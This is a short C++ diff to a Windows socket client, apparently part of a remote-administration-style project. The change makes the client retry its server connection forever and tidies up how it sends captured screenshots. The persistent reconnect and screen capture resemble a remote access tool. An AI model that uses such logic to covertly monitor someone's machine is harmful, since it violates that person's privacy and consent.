@@ -32,12 +32,23 @@ Client::Client(const char* serverIP_, u_short port_) : m_serverIP(serverIP_), m_
     addr.sin_family = AF_INET;
     addr.sin_port = htons(port_);
 
-    int connResult = connect(m_socket, (sockaddr*)&addr, sizeof(addr));
-    if (connResult == SOCKET_ERROR)
+    while(true)
     {
-        std::cerr << "Can't connect to server! Quitting" << std::endl;
-        stop();
+        int connResult = connect(m_socket, (sockaddr*)&addr, sizeof(addr));
+        if (connResult == SOCKET_ERROR) {
+            std::cerr << "Can't connect to server!" << std::endl;
+            Sleep(1000); 
+            continue; 
+        }
+        break; 
     }
+
+    // int connResult = connect(m_socket, (sockaddr*)&addr, sizeof(addr));
+    // if (connResult == SOCKET_ERROR)
+    // {
+    //     std::cerr << "Can't connect to server! Quitting" << std::endl;
+    //     stop();
+    // }
 }
 
 Client::~Client() {
@@ -236,11 +247,7 @@ std::vector<BYTE> Client::captureScreenshot() {
 void Client::sendScreenshot(SOCKET sock) {
     std::vector<BYTE> screenshotData = captureScreenshot();
 
-    int commandSent = send(sock, Centaurus::cmd::screenshot.c_str(), Centaurus::cmd::screenshot.size(), 0);
-    if (commandSent == SOCKET_ERROR) {
-        std::cerr << "Failed to send screenshot command, error: " << WSAGetLastError() << std::endl;
-        return;
-    }
+    sendData(sock, Centaurus::cmd::screenshot);
     
     int totalBytesSent = 0;
     int dataSize = static_cast<int>(screenshotData.size());
